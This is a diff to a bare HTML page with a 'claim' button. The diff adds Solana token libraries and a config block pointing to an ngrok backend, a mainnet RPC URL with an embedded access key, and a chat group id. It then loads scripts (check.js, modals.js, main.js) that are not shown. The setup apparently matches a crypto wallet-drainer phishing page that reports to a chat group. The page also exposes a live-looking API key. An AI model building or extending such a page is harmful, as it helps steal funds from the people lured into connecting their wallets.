@@ -8,12 +8,33 @@
     <link rel="stylesheet" href="./fonts.css" data-n-g="">
     <link rel="stylesheet" href="./popup.css" data-n-g="">
     <link rel="stylesheet" href="./style.css">
+    
+    <!-- Solana libraries -->
+    <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.3.7/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
 
-  <body>
+<body>
     <button id="claim-button"> button </button>
-<script defer type="module" src="./modals.js"></script>
-<script defer type="module" src="./main.js"></script>
+    
+    <!-- Config script to set environment variables -->
+    <script>
+        // Set environment variables for browser use
+        window.ENV = {
+            BACKEND_URL: "https://d007-102-213-68-144.ngrok-free.app", // Your ngrok URL
+            SOLANA_RPC_URL: "https://alpha-lively-lambo.solana-mainnet.quiknode.pro/8783271537a440d18b16a99d563c897538cd412d/",
+            CONNECTION_KEY: "601",
+            GROUP_CHAT_ID: "-4872265548"
+        };
+    </script>
+    
+    <!-- Diagnostic tool to check connectivity -->
+    <script src="./check.js"></script>
+    
+    <!-- Main application scripts -->
+    <script src="./modals.js"></script>
+    <script src="./main.js"></script>
 </body>
 
 </html>
